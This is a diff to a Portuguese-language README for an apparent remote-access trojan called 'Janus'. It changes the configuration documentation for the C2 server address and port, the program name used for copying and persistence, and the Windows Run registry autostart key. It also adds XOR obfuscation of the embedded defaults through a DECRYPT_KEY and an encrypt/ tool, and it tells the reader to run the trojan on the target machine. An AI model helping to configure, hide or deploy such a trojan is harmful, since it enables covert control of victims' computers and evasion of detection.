@@ -54,20 +54,24 @@ python3 connection.py
 
 ### 2. Configurar o Trojan (Alvo)
 
-Crie um arquivo `.env` na mesma pasta do `janus.py` e configure as variáveis. Todas têm valores padrão:
+Crie um arquivo `.env` na mesma pasta do `janus.py` e configure as variáveis. O trojan é **env-only**: se a variável existir, usa o valor dela; se não existir, tenta decriptar o padrão ofuscado embutido com `DECRYPT_KEY`; sem chave, o valor fica vazio (sem `.env` o trojan não conecta).
 
-| Variável | Default | Descrição |
+| Variável | Padrão (sem `.env`) | Descrição |
 | :--- | :--- | :--- |
-| `JANUS_IP` | `127.0.0.1` | Endereço do servidor C2 |
-| `JANUS_PORT` | `443` | Porta do servidor C2 |
-| `PROGRAM_NAME` | `MicrosoftUpdateService` | Nome usado na cópia/persistência |
-| `REGISTRY_KEY_PATH` | `Software\Microsoft\Windows\CurrentVersion\Run` | Chave de autostart no registro |
+| `JANUS_IP` | `""` | Endereço do servidor C2 |
+| `JANUS_PORT` | `0` | Porta do servidor C2 |
+| `PROGRAM_NAME` | `""` | Nome usado na cópia/persistência |
+| `REGISTRY_KEY_PATH` | `""` | Chave de autostart no registro |
+| `DECRYPT_KEY` | `""` | Chave XOR dos padrões ofuscados (obrigatória para o env-only funcionar) |
 
 Exemplo:
 ```ini
 JANUS_IP=192.168.0.10
 JANUS_PORT=443
+DECRYPT_KEY=trocar-pela-sua-chave
 ```
+
+> **Ofuscação (`encrypt/`):** os valores embutidos no `janus.py` (IP, porta, `PROGRAM_NAME`, chave de registro) estão em hex XOR gerado pela ferramenta `encrypt/`. Para customizar, gere o hex com ela e troque no código, usando a mesma `DECRYPT_KEY` no `.env`.
 
 Execute na máquina alvo:
 
